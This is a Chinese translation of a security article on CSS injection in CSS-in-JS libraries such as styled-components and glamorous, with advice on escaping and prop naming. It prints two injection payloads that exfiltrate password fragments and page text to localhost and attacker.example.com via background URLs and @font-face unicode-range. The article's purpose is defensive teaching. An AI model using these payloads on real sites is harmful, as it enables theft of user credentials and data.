
> * 原文地址：[How can I use CSS-in-JS securely?](https://reactarmory.com/answers/how-can-i-use-css-in-js-securely)
> * 原文作者：[James K Nelson](https://reactarmory.com/authors/james-k-nelson)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/TODO/how-can-i-use-css-in-js-securely.md](https://github.com/xitu/gold-miner/blob/master/TODO/how-can-i-use-css-in-js-securely.md)
> * 译者：[Yuuoniy](https://github.com/Yuuoniy)
> * 校对者：[HydeSong](https://github.com/HydeSong) [Tina92](https://github.com/Tina92)

# 如何安全地使用 CSS-in-JS ？

CSS-in-JS 允许我把 JavaScript 变量插入到 CSS 中，这给了我很大的权限，但这样安全吗？

恶意用户可以仅仅通过 CSS 注入的方式给我造成怎样的破坏性影响？我该如何进行防范？

CSS-in-JS 是一门令人兴奋的新技术，完全不需要 CSS  的 `class` 名字。它可以充分利用 CSS 的功能直接给你的组件添加样式。不幸的是，它也促使未转义的 props 插入到 CSS 中，将你暴露给注入攻击。

而 CSS 注入攻击是一个 **重大的安全隐患**。

如果你的网站或 APP 接受用户输入并将其显示给其他用户，那么使用如 [styled-components](https://www.styled-components.com/docs/advanced#security)  或 [glamorous](https://github.com/paypal/glamorous/issues/300) 这样的 CSS-in-JS 库可能会破坏你的网站。更糟的是，你可能会无意中允许攻击者从用户端发出请求，提取他们的数据，窃取其证书，甚至执行任意的 JavaScript 脚本。

当然，安全地使用 CSS-in-JS 是有可能的，你只需要遵守以下简单的法则。

## 黄金法则

永远不要将用户的输入插入到样式表中。

没有经过处理的用户输入很难可以正确地插入到样式表。所以除非你知道你在做什么，否则不要尝试将其插入。

如果你必须基于用户输入添加样式，请考虑使用原生的 style 属性，你传给 `style` 对象的任何东西都是安全的。

如果该法则被正确地遵循，就可以确保用户的安全。但仅仅一次失误用户的密码就可能被偷...

## 利用 CSS-in-JS 

CSS-in-JS 就像 CSS 中的 `eval`，它们接受任意输入并将其当作 CSS 来读取。

问题是它们会逐字读取任意输入，即使是不可靠的。更糟糕的是，它们允许你通过 `props`  传递变量，从而助长了不可靠的输入。

如果你的样式组件有 props 的值是用户设置的，那么你需要手动处理输入。否则恶意用户将能够将任意样式注入其他用户的页面。

但样式只是样式，对吗？它们不会那么吓人...

### 窃取密码的 `color`

假设你想允许用户选择他们的个人资料页面的颜色，就像 Twitter 那样。对于普通的 CSS 来说，这有点难实现。但是 CSS-in-JS 可以使其变得简单，你只需要添加一个 `color` prop！

正因为如此，后端开发人员已经处理了 API 方面的事情，现在你可以在你的样式组件中添加 `color` prop。

由于你的 APP 是单页面的，因此打开登录表单时会覆盖个人资料页。而且由于后端开发人员没有验证就将 color 值存储在文本字段中，恶意用户可以设置一个会窃取用户密码的 `color`：

因为工具对插入的字符串执行类似 CSS 的 `eval` 操作，所以这样会起作用。 如果你使用标准的内联样式，或者始终记得清理你的输入，那么你是安全的。

```
// - 添加更多的选择器来获取更多信息
// - 你也可以使用不同类型的属性选择器
// - 把接受的值与某个字典比较
//     从而对你的数据作出相对正确的猜测

var color = `#8233ff;
html:not(&) {
  input[value*="pa"] { background: url(https://localhost/?pa) }
  input[value*="as"] { background: url(https://localhost/?as) }
  input[value*="ss"] { background: url(https://localhost/?ss) }
  input[value*="sw"] { background: url(https://localhost/?sw) }
  input[value*="wo"] { background: url(https://localhost/?wo) }
  input[value*="or"] { background: url(https://localhost/?or) }
  input[value*="rd"] { background: url(https://localhost/?rd) }
}`
```

你可以在 [Reading Data via CSS Injection](https://www.curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html) 阅读更多像这样的攻击。

通过使用 password 输入框上的属性选择器根据当前输入改变背景图时，这种攻击也会起作用。以下是在我输入 ‘密码’ 之后 Chrome 开发工具的网络选项卡的样子：

![](https://reactarmory.com/cad5ea782b425e1e9ac072b3c8aa52d9.png)

虽然这种攻击不能窃取所有密码，但它仍会窃取相当多的密码。一些被盗的密码足以毁掉你一天的工作。

这是在 codesandbox 中使用 styled-components 进行的 [概念验证](https://codesandbox.io/s/llnzkwk0mz)。

### 提取数据的 avatar

假设你的老板想要你的应用程序中的每个用户的名字旁有 avatar。但你的老板有点吝啬，不想为 avatar 支付带宽费用。所以他希望你提供连接到外部 URL 的方案。或者其他方案。

当然，你的 `Identity` 组件是 glamorous 构建的样式组件。它接受整个用户对象作为 prop，该对象包含名字，twitter，以及其他一些东西。后端开发人员为对象添加 `avatarURL`，然后设计师使用 `background-image` 标签标记图像。

而现在，任何人浏览 avatar 都会从页面上具体元素获得数据。以下就是 avatarURL 做的：

这看起来像是过去流行的的老式 SQL 注入，但是使用了CSS。我们真的生活在未来啊。

```
const avatarURL = `blue;}

@font-face{
  font-family:poc;
  src: url(https://attacker.example.com/?D);
  unicode-range:U+0044;
}
@font-face{
  font-family:poc;
  src: url(https://attacker.example.com/?R);
  unicode-range:U+0052;
}
@font-face{
  font-family:poc;
  src: url(https://attacker.example.com/?O);
  unicode-range:U+004F;
}
@font-face{
  font-family:poc;
  src: url(https://attacker.example.com/?P);
  unicode-range:U+0050;
}

.logged-in {
  font-family: poc;
}

.something{color: red
`
```

你可以在 [基于CSS的攻击：滥用 @font-face 的 unicode-range](http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html) 阅读更多类似的攻击。

链接文章的作者向 chrome 团队[报告](https://code.google.com/p/chromium/issues/detail?id=543078)了一个错误，但它已被标记为 WontFix 。

通过在自定义字体中为每个字符添加不同的 URL，然后将该字体应用于你想要提取的文本。你可以获取字符列表，而如果在用户输入时应用它，则可以保证你得到正确顺序的输入以及时间信息。你也可以结合其他的东西，如 `::first-letter` 或 `::selection` 选择器以获得更详细的信息。

Chrome 开发者工具的网络选项卡显示当前用户名称的提取方式：

![](https://reactarmory.com/42f2eed3d995577d1558878de3e09d91.png)

这是在 codesandbox 上利用 glamorous 进行的[概念验证](https://codesandbox.io/s/m541x36wpj)

### 执行任意 JavaScript 脚本

React 支持 IE9，并在 [不久的将来停止支持 IE8](https://facebook.github.io/react/blog/2016/01/12/discontinuing-ie8-support.html)。

如果你可以把 JavaScript 的文本文件放在同一个域内，IE9 和更早版本的 IE 都会允许你在样式表中执行任意的 JavaScript 脚本 。

如果你有用户使用 IE9，有恶意用户试图以某种方式上传文件，并通过未转义的 prop 将关联的 `behavior` 属性注入到样式表中，然后 **恶意用户可以窃取 IE9 用户的帐户**。

我不打算进行相关展示，但请明白，这种类型的攻击之前已经广泛地发生过了。你可以在 [在 CSS 内部执行 JavaScript 脚本](http://www.diaryofaninja.com/blog/2013/10/30/executing-javascript-inside-css-another-reason-to-whitelist-and-encode-user-input) 一文中了解相关的详细信息。

## 实际考虑

只要你遵循黄金法则，这些代码就不会成为问题。

### 不要将用户的输入插入到样式表中。

当然，即使你无法将用户输入插入到样式中，你仍然可以将其用于无样式的 props 或将静态变量插入到样式中。

但是这引出了另一个问题：你如何知道样式组件上的哪些 props 可以安全地接受用户输入？

### 关注点分离

React 的一个重要特性是它允许你创建组件，便于 [关注点分离](https://reactarmory.com/answers/how-should-i-separate-components)。子组件不需要知道他们的 props 来自哪里。父组件不需要知道他们的孩子如何实现。组件是相互独立的，这样提高了它们的可维护性和可复用性。

Unsanitized props 打破了这一独立性

例如，考虑一个接受两个 props 的组件：一个是插入到样式表中的 unsanitized `theme`  prop，另外一个是 `content` prop：

```
// `theme` 可以接受用户输入吗？`content` 可以接受用户输入吗？
function MyComponent({ theme, content }) {
  return (
    <MyStyledComponent theme={theme}>
      {content}
    </MyStyledComponent>
  )
}
```

我们不能很快地根据组件的名字判断 `theme` 或 `content` 在样式表中使用时是否被处理过。事实上，即使看具体的实现我们也不能知道 `theme`是如何被使用的。

为了确保你的组件具有可复用性和可维护性，请使用一种在 props 不安全时清晰易懂的命名方案。例如：

```
// `unsanitizedTheme` 不能接受用户输入
// `content` 可以接受用户的输入
function MyComponent({ unsanitizedTheme, content }) {
  return (
    <MyStyledComponent unsanitizedTheme={unsanitizedTheme}>
      {content}
    </MyStyledComponent>
}
```

### 别相信任何人

知道第三方库中的 prop 是否安全的唯一方法是研究并检查源代码。

例如，考虑第三方工具提示组件：

```
<Tooltip
  position="left"
  content={itemName}
/>
```

虽然你可以假定将用户输入传递给 `content` prop 是安全的，但在你检查源码之前你无法真正地知道其安全性。

你可能会觉得这是一个很勉强的例子，但实际上这是一个基于 styled-components 的流行 UI 工具包中 [报告](https://github.com/jxnblk/rebass/issues/318) 的安全问题。

你可以在 codesandbox 上查看这个问题的概念验证。

实际上，即使你使用的 UI 工具包目前是安全的，你也不能保证在执行 `npm upgrade` 后它仍然安全。

所以除非你建立的是一个不需要用户输入的静态网站，否则你应该完全避免在内部使用 CSS-in-JS 的第三方 UI 库。这是确保网站安全的唯一方法。

### 但我需要基于用户输入添加样式...

基于用户输入添加样式的最安全的方法是使用旧的普通内联样式，即 style prop。你放在 `style` 对象中的任何东西都是安全的。

但是，如果内联样式不够，你需要使用 [CSS.escape](https://drafts.csswg.org/cssom/#the-css.escape%28%29-method) 手动转义用户的每一次输入。这个是一个相对新的标准，所以你需要使用 [polyfill](https://drafts.csswg.org/cssom/#the-css.escape%28%29-method)。

请记住，一个 unescaped prop 会给你带来麻烦。因此，如果你要插入任何包含用户输入的 props，唯一安全的方法就是在你的应用程序上转义所有的 prop。

## 但这是一个后端的问题？

我听到过的一个借口是所有这些问题都是后端开发人员的错误; 他们应该在存储数据之前处理数据。当然，我是从一个前端开发人员那里听到的借口。

**安全问题关乎每个人**。虽然我们大多数人都尽力做正确的事情，对输入进行了恰当的处理，但我们都是人，是人就会犯错误。这就是为什么假设后端始终会提供干净的数据是不负责任的，同样假设前端能做到这样的事情也是不负责任的。

## 但插入 JSX 可以吗？ 

可以。因为 **JSX 默认情况下不信任插入的字符串**。如果你使用 `dangerouslySetInnerHTML` prop，它只会让你在插入 HTML 时不安全 ，并传递 `{ __html: 'your_string' }` 格式的对象。

没有人想要将未经过滤的用户输入插入到 HTML。但是人会犯错误，这就是为什么 React 要求你明确地告知它直接插入的字符串是安全的。

目前，CSS-in-JS 不提供任何自动处理机制（但这里有 [讨论](https://github.com/styled-components/styled-components/issues/1105#issuecomment-325273993)）。所以在它提供之前，请确保将任何插入的 props 命名为 `unsanitizedSomething`。

如果能完全避免使用插入的 props 是最好不过了。


---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[React](https://github.com/xitu/gold-miner#react)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计) 等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)、[官方微博](http://weibo.com/juejinfanyi)、[知乎专栏](https://zhuanlan.zhihu.com/juejinfanyi)。
